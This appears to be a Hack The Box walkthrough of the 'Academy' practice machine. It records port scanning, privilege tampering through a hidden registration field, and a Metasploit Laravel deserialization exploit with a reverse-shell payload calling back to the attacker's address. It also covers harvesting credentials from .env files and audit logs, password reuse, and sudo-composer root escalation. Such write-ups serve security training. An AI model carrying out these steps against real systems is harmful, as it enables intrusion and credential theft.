# Academy
## nmap -T3 -A -p- -o academy.nmap 10.10.10.215

[Nmap port scan][1]

## gobuster dir -u academy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o academy-dir.txt -t 50
[dirbuster output][2]


## Exploting web app

Looking into the source of the registration form
```html
 <form class="login_form" method="POST" autocomplete="off">
            <br/>
            <br/>
            <img src="images/logo.png" class="center" width="130" height="130">
            <br/>
            <br/>
            <table>
                <tr>
                    <td class="form_text" align="left">&nbsp;&nbsp;&nbsp;Username</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="text" id="uid" name="uid" /></td>
                </tr>
                <tr>
                    <td class="form_text" align="left"><br/>&nbsp;&nbsp;&nbsp;Password</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="password" id="password" name="password" /></td>
                </tr>
                <tr>
                    <td class="form_text" align="left"><br/>&nbsp;&nbsp;&nbsp;Repeat Password</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="password" id="confirm" name="confirm" /></td>
                </tr>
                <input type="hidden" value="0" name="roleid" />
            </table>
            <br/><br/>
            <input type="submit" class="button" value="Register"/> 
            </p>
        </form>
```

we can find an hidden field ***roleid***, using a proxy like burpsuite we can set this value to 1 so it give us
an admin account that we can use to login into admin.php

Inside the admin page we can see that there is some problem not fixed with ***dev-staging-01.academy.htb***
Here we can find a laravel log dump in which we can find the database creds 

```raw
DB_PORT "3306"

DB_DATABASE "homestead"

DB_USERNAME "homestead"

DB_PASSWORD "secret"
```

Plus there is a redis server with no password on port 6379

Looking at nmap seems that the port of mysql server is 33060 maybe this is the problem with laravel console (?).

Using metasploit with exploit/unix/http/laravel_token_unserialize_exec with this options:

```raw
options 

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file
   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     academy.htb                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                            yes       The target port (TCP)
   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                                             yes       Path to target webapp
   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.158     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

we get a shell as www-data launch `python3 -c "import pty;pty.spawn('/bin/bash')"` to get a bash tty and `export TERM='xterm'`.

Going into `/var/www/html/academy` there is an interesting file called `.env` that is used by laravel to define some options

```raw
cat .env
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```
In this file there is a mysql password for account dev. 
Account for this machine are:

`21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n`

we can try to login into one of the by using this ***mySup3rP4s5w0rd!!***
After trying to list the files of the home directory seems the ***cry0l1t3*** has the user flag -> ***cry0l1t3:mySup3rP4s5w0rd!!*** does the trick

launch an http server to download linpeas inside the machine: `python3 -m http.server`

After linpeas runs the log show: 
```
[+] Checking for TTY (sudo/su) passwords in audit logs
/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

Converting from HEX to ASCII the data field we obtain: `mrb3n_Ac@d3my!` -> ***mrb3n:mrb3n_Ac@d3my!***

## mrb3n

This user seems can run sudo with this capabilities: 

```raw
sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

Escalate via [sudo + composer][3] give us the root 

![htbbadge](https://www.hackthebox.eu/badge/image/272787)

[//]: #links
[1]: academy.nmap
[2]: academy-dir.txt
[3]: https://gtfobins.github.io/gtfobins/composer/
